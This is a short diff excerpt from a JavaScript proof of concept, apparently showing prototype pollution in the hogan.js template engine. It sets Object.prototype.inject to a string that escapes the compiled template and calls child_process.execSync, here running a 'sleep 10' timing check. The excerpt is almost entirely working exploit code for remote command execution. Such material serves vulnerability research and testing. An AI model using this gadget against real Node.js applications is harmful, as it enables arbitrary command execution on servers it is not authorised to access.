@@ -3,6 +3,7 @@ const hogan = require("hogan.js");
 
 /* Polluted Payload*/
 // inject property to root prototype
+// inject could be any string
 Object.prototype.name = '2';
 Object.prototype.inject = "},flag:process.mainModule.require(`child_process`).execSync(`sleep 10`).toString()}}//"
 
